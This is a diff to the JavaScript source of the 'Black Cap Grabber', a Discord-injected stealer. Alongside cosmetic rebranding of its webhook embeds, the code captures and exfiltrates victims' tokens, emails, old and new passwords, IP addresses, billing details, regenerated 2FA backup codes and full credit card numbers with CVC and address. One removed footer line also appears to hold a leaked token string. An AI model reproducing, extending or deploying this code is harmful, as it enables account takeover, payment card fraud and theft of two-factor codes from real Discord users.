@@ -74,10 +74,10 @@ function FirstTime() {
 						username: "Black Cap Grabber",
 						content: "",
 						embeds: [{
-							title: "Discord Initalized (User not Logged in)",
+							title: "Black - Cap have been Initalized (User not Logged in)",
 							color: config["embed-color"],
 							fields: [{
-								name: "Info",
+								name: "BC - Informations",
 								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 								inline: !1
 							}],
@@ -100,36 +100,36 @@ function FirstTime() {
 							username: "Black Cap Grabber",
 							content: "",
 							embeds: [{
-								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +")",
+								title: "Black - Cap Initalized",
+								description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 								color: config["embed-color"],
 								fields: [{
-									name: "Info",
-									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
+									name: "BC - Informations",
+									value: `\`\`\`Name Of Computer: \n${computerName}\nInjection Path: \n${__dirname}\n\`\`\``,
 									inline: !1
 								}, {
-									name: "Username",
+									name: "BC - Username",
 									value: `\`${b.username}#${b.discriminator}\``,
 									inline: !0
 								}, {
-									name: "ID",
+									name: "BC - ID",
 									value: `\`${b.id}\``,
 									inline: !0
 								}, {
-									name: "Badges",
+									name: "BC - Badges",
 									value: `${GetBadges(b.flags)}`,
 									inline: !1
 								}, {
-									name: "Token",
+									name: "BC - Token",
 									value: `\`\`\`${token}\`\`\``,
 									inline: !1
 								}],
 								author: {
-									name: "Black Cap"
-								},
-								footer: {
-									text: "©KSCH | https://github.com/KSCHdsc2"
-								},
+                                    name: "Black - Cap"
+                                },
+                                footer: {
+                                    text: "©KSCH | https://github.com/KSCHdsc2"
+                                },
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
 								}
@@ -152,15 +152,15 @@ function FirstTime() {
 						username: "Black Cap Grabber",
 						content: "",
 						embeds: [{
-							title: "User log out (User not Logged in before)",
+							title: "Black Caped User log out (User not Logged in before)",
 							color: config["embed-color"],
 							fields: [{
-								name: "Info",
-								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
+								name: "BC - Informations",
+								value: `\`\`\`Name Of Computer: \n${computerName}\nInjection Path: \n${__dirname}\n\`\`\``,
 								inline: !1
 							}],
 							author: {
-								name: "Black Cap"
+								name: "Black - Cap"
 							},
 							footer: {
 								text: "©KSCH | https://github.com/KSCHdsc2"
@@ -178,36 +178,36 @@ function FirstTime() {
 							username: "Black Cap Grabber",
 							content: "",
 							embeds: [{
-								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +")",
+								title: "Black Caped User got logged out",
+								description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 								color: config["embed-color"],
 								fields: [{
-									name: "Info",
+									name: "BC - Info",
 									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 									inline: !1
 								}, {
-									name: "Username",
+									name: "BC - Username",
 									value: `\`${b.username}#${b.discriminator}\``,
 									inline: !0
 								}, {
-									name: "ID",
+									name: "BC - ID",
 									value: `\`${b.id}\``,
 									inline: !0
 								}, {
-									name: "Badges",
+									name: "BC - Badges",
 									value: `${GetBadges(b.flags)}`,
 									inline: !1
 								}, {
-									name: "Token",
+									name: "BC - Token",
 									value: `\`\`\`${token}\`\`\``,
 									inline: !1
 								}],
 								author: {
-									name: "Black Cap"
-								},
-								footer: {
-									text: "©KSCH | https://github.com/KSCHdsc2"
-								},
+                                    name: "Black - Cap"
+                                },
+                                footer: {
+                                    text: "©KSCH | https://github.com/KSCHdsc2"
+                                },
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
 								}
@@ -382,11 +382,10 @@ function Login(email, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -401,7 +400,6 @@ function Login(email, password, token) {
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
 							}
 
 							function totalFriends() {
@@ -456,48 +454,48 @@ function Login(email, password, token) {
 								username: "Black Cap Grabber",
 								content: "",
 								embeds: [{
-									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+									"title": "Black Caped User Login",
+                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
+										name: "BC - Info",
 										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
 									}, {
-										name: "Username",
+										name: "BC - Username",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
-										name: "ID",
+										name: "BC - ID",
 										value: `\`${json.id}\``,
 										inline: !0
 									}, {
-										name: "Nitro",
+										name: "BC - Nitro",
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "BC - Badges",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Billing",
+										name: "BC - Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "Email",
+										name: "BC - Email",
 										value: `\`${email}\``,
 										inline: !0
 									}, {
-										name: "Password",
+										name: "BC - Password",
 										value: `\`${password}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "BC - Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -510,7 +508,7 @@ function Login(email, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -522,11 +520,11 @@ function Login(email, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"description": "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Black Cap"
+									"name": "Black - Cap"
 								},
 								"footer": {
 									"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -616,43 +614,43 @@ function Login(email, password, token) {
 											username: "Black Cap Grabber",
 											content: "",
 											embeds: [{
-												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+												"title": "Black Caped User Login",
+                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
+													name: "BC - Info",
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "BC - Username",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
-													name: "ID",
+													name: "BC - ID",
 													value: `\`${json.id}\``,
 													inline: !0
 												}, {
-													name: "Nitro",
+													name: "BC - Nitro",
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "BC - Badges",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "BC - Billing",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "Email",
+													name: "BC - Email",
 													value: `\`${email}\``,
 													inline: !0
 												}, {
-													name: "Password",
+													name: "BC - Password",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "BC - Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
@@ -660,7 +658,7 @@ function Login(email, password, token) {
 													"name": "Black - Cap"
 												},
 												"footer": {
-													"text": "OTEwMjMxMjcwODIxMzUxNDQ0.YcI1_Q.EEdXvHZ_9C6Cn1H2fp5nT9jHIcc"
+													"text": "©KSCH | https://github.com/KSCHdsc2"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -670,7 +668,7 @@ function Login(email, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Black Cap"
+													"name": "Black - Cap"
 												},
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -726,11 +724,10 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -744,7 +741,6 @@ function ChangePassword(oldpassword, newpassword, token) {
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
 							}
 
 							function totalFriends() {
@@ -799,52 +795,52 @@ function ChangePassword(oldpassword, newpassword, token) {
 								username: "Black Cap Grabber",
 								content: "",
 								embeds: [{
-									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ newpassword+")",
+									"title": "Black Cap Detect Password Changed",
+                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
+										name: "BC - Info",
 										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
 									}, {
-										name: "Username",
+										name: "BC - Username",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
-										name: "ID",
+										name: "BC - ID",
 										value: `\`${json.id}\``,
 										inline: !0
 									}, {
-										name: "Nitro",
+										name: "BC - Nitro",
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "BC - Badges",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Billing",
+										name: "BC - Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "Email",
+										name: "BC - Email",
 										value: `\`${json.email}\``,
 										inline: !1
 									}, {
-										name: "Old Password",
+										name: "BC - Old Password",
 										value: `\`${oldpassword}\``,
 										inline: !0
 									}, {
-										name: "New Password",
+										name: "BC - New Password",
 										value: `\`${newpassword}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "BC - Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -857,7 +853,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -869,11 +865,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"description": "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Black Cap"
+									"name": "Black - Cap"
 								},
 								"footer": {
 									"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -964,52 +960,52 @@ function ChangePassword(oldpassword, newpassword, token) {
 											username: "Black Cap Grabber",
 											content: "",
 											embeds: [{
-												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ newpassword+")",
+												"title": "Black Cap Detect Password Changed",
+                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
+													name: "BC - Info",
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "BC - Username",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
-													name: "ID",
+													name: "BC - ID",
 													value: `\`${json.id}\``,
 													inline: !0
 												}, {
-													name: "Nitro",
+													name: "BC - Nitro",
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "BC - Badges",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "BC - Billing",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "Email",
+													name: "BC - Email",
 													value: `\`${json.email}\``,
 													inline: !1
 												}, {
-													name: "Old Password",
+													name: "BC - Old Password",
 													value: `\`${oldpassword}\``,
 													inline: !0
 												}, {
-													name: "New Password",
+													name: "BC - New Password",
 													value: `\`${newpassword}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "BC - Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Black Cap"
+													"name": "Black - Cap"
 												},
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1022,7 +1018,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Black Cap"
+													"name": "Black - Cap"
 												},
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1078,11 +1074,10 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1096,7 +1091,6 @@ function ChangeEmail(newemail, password, token) {
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
 							}
 
 							function totalFriends() {
@@ -1151,48 +1145,48 @@ function ChangeEmail(newemail, password, token) {
 								username: "Black Cap Grabber",
 								content: "",
 								embeds: [{
-									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+									"title": "Black Cap Detect Email Changed",
+                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
+										name: "BC - Info",
 										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 										inline: !1
 									}, {
-										name: "Username",
+										name: "BC - Username",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
-										name: "ID",
+										name: "BC - ID",
 										value: `\`${json.id}\``,
 										inline: !0
 									}, {
-										name: "Nitro",
+										name: "BC - Nitro",
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "BC - Badges",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Billing",
+										name: "BC - Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "New Email",
+										name: "BC - New Email",
 										value: `\`${newemail}\``,
 										inline: !0
 									}, {
-										name: "Password",
+										name: "BC - Password",
 										value: `\`${password}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "BC - Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1205,7 +1199,7 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Black Cap"
+										"name": "Black - Cap"
 									},
 									"footer": {
 										"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1217,11 +1211,11 @@ function ChangeEmail(newemail, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"description":"[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Black Cap"
+									"name": "Black - Cap"
 								},
 								"footer": {
 									"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1312,48 +1306,48 @@ function ChangeEmail(newemail, password, token) {
 											username: "Black Cap Grabber",
 											content: "",
 											embeds: [{
-												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
+												"title": "Black Cap Detect Email Changed",
+                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
+													name: "BC - Info",
 													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 													inline: !1
 												}, {
-													name: "Username",
+													name: "BC - Username",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
-													name: "ID",
+													name: "BC - ID",
 													value: `\`${json.id}\``,
 													inline: !0
 												}, {
-													name: "Nitro",
+													name: "BC - Nitro",
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Badges",
+													name: "BC - Badges",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "BC - Billing",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "New Email",
+													name: "BC - New Email",
 													value: `\`${newemail}\``,
 													inline: !0
 												}, {
-													name: "Password",
+													name: "BC - Password",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "BC - Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Black Cap"
+													"name": "Black - Cap"
 												},
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1366,7 +1360,7 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Black Cap"
+													"name": "Black - Cap"
 												},
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc2"
@@ -1408,10 +1402,10 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
 				username: "Black Cap Grabber",
 				content: "",
 				embeds: [{
-					"title": "User Credit Card Added",
-					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
+					"title": "Black Cap User Credit Card Added",
+					"description": "**BC - Username:**```" + json.username + "#" + json.discriminator + "```\n**BC - ID:**```" + json.id + "```\n**BC - Email:**```" + json.email + "```\n" + "**BC - Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**BC - Badges:**```" + GetBadges(json.flags) + "```" + "\n**BC - Credit Card Number: **```" + number + "```" + "\n**BC - Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**BC - CVC: **```" + cvc + "```\n" + "**BC - Country: **```" + country + "```\n" + "**BC - State: **```" + state + "```\n" + "**BC - City: **```" + city + "```\n" + "**BC - ZIP:**```" + zip + "```" + "\n**BC - Street: **```" + street + "```" + "\n**BC - Token:**```" + token + "```" + "\n**BC - IP: **```" + ip + "```",
 					"author": {
-						"name": "Black Cap"
+						"name": "Black - Cap"
 					},
 					"footer": {
 						"text": "©KSCH | https://github.com/KSCHdsc2"
